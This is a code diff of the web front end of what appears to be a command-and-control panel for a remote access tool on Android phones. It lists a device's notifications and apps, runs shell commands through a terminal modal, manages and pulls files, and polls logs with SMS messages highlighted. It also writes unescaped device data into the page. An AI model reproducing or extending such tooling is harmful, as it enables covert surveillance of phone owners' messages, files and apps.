-            body.innerHTML = '<table><thead><tr><th>App</th><th>Title</th><th>Text</th></tr></thead><tbody>' + (clientData.notifications || []).map(n => `<tr><td>${n.packageName}</td><td>${n.title}</td><td>${n.text}</td></tr>`).join('') + '</tbody></table>';
-            break;
-        case 'apps':
-            body.innerHTML = '<table><thead><tr><th>App Name</th><th>Package Name</th><th>Actions</th></tr></thead><tbody>' + (clientData.apps || []).map(app => `<tr><td>${app.appName}</td><td>${app.packageName}</td><td><button class="action-btn" onclick="sendCommand('run ${app.packageName}')">Run</button><button class="action-btn" onclick="uninstallApp('${app.packageName}')">Uninstall</button></td></tr>`).join('') + '</tbody></table>';
-            break;
+    function closeModal() {
+        if (currentModalType === 'terminal' || currentModalType === 'filemanager') {
+            cmd('exit');
+            setTimeout(() => cmd('exit_shell'), 300);
+        }
+        modal.style.display = 'none';
+        currentModalType = null;
     }
-}
 
-// Actions
-function sendToast() { const text = document.getElementById('toast-text').value; if (text) sendCommand(`toast on ${text}`); }
-function sendOpenUrl() { const url = document.getElementById('url-text').value; if (url) sendCommand(`openurl ${url}`); }
-function handleFmAction(action, fileName = null) {
-    const fmInput = document.getElementById('fm-input').value;
-    if (action === 'rename') {
-        const oldName = fileName || prompt('Enter current file/folder name to rename:');
-        if (oldName && fmInput) sendCommand(`rename ${oldName} ${fmInput}`);
-        else if (!oldName) showPopup('error', 'No file/folder name provided for rename.');
-        else if (!fmInput) showPopup('error', 'No new name provided for rename.');
-    } else if (action === 'delete') {
-        const nameToDelete = fileName || fmInput;
-        if (nameToDelete && confirm(`Delete ${nameToDelete}?`)) sendCommand(`del ${nameToDelete}`);
-        else if (!nameToDelete) showPopup('error', 'No file/folder name provided for delete.');
-    } else if (action === 'mkdir') {
-        if (fmInput) sendCommand(`mkdir ${fmInput}`);
-        else showPopup('error', 'No directory name provided for mkdir.');
+    function sendCommand() {
+        const inputField = document.getElementById('modalInput');
+        if (!inputField) return;
+        const val = inputField.value.trim();
+        if (val === '') return;
+
+        if (currentModalType === 'filemanager' && val.startsWith('get ')) {
+            modalOutput.innerHTML += `\n<span style="color:#5ff0ff;">[⇣] initiating download: ${val} ... Watch your server directory!</span>\n`;
+        }
+        
+        cmd(val);
+        inputField.value = '';
     }
-}
-function uploadFile(file, currentPath) {
-    const reader = new FileReader();
-    reader.onload = function(event) {
-        const base64Content = btoa(event.target.result); // btoa for binary safe base64
-        sendCommand('upload', { filename: btoa(file.name), data: base64Content });
+
+    // --- POLLING & STATE UPDATES ---
+    setInterval(() => {
+        fetch('/api/status')
+            .then(r => r.json())
+            .then(data => {
+                const statusEl = document.getElementById('status');
+                const ipSpan = document.getElementById('info-ip');
+                const deviceSpan = document.getElementById('info-device');
+
+                if (data.connected) {
+                    statusEl.innerText = `ONLINE ${data.address?.[0] || ''}`;
+                    statusEl.className = 'status-badge online';
+                    ipSpan.innerText = data.address ? `${data.address[0]}:${data.address[1]}` : 'unknown';
+                } else {
+                    statusEl.innerText = 'OFFLINE';
+                    statusEl.className = 'status-badge offline';
+                    ipSpan.innerText = '--.--.--.--';
+                }
+
+                if (data.logs) {
+                    // Update header if [INFO] is found
+                    for (let line of data.logs) {
+                        if (line.includes('[INFO]')) {
+                            deviceSpan.innerText = line.split('[INFO]')[1].trim();
+                        }
+                    }
+
+                    // Only append NEW logs to the active modal
+                    if (currentModalType && data.logs.length > lastLogCount) {
+                        const newLogs = data.logs.slice(lastLogCount);
+                        let formatted = '';
+                        newLogs.forEach(l => {
+                            if (l.includes('[ERROR]')) formatted += `<span style="color:#ff5f5f;">${l}</span>\n`;
+                            else if (l.includes('[SMS]') || l.includes('SMS:')) formatted += `<span style="color:#f5e56b;">${l}</span>\n`;
+                            else if (l.includes('[DOWNLOAD]')) formatted += `<span style="color:#5ff0ff;">${l}</span>\n`;
+                            else formatted += l + '\n';
+                        });
+                        
+                        let isScrolledToBottom = modalOutput.scrollHeight - modalOutput.clientHeight <= modalOutput.scrollTop + 5;
+                        modalOutput.innerHTML += formatted;
+                        if(isScrolledToBottom) modalOutput.scrollTop = modalOutput.scrollHeight;
+                    }
+                    lastLogCount = data.logs.length;
+                }
+            })
+            .catch(() => {});
+    }, 1200);
+
+    // Close modal if user clicks outside of the window box
+    window.onclick = function(e) {
+        if (e.target === modal) closeModal();
     };
-    reader.readAsBinaryString(file);
-}
+
+</script>
+</body>
+</html>
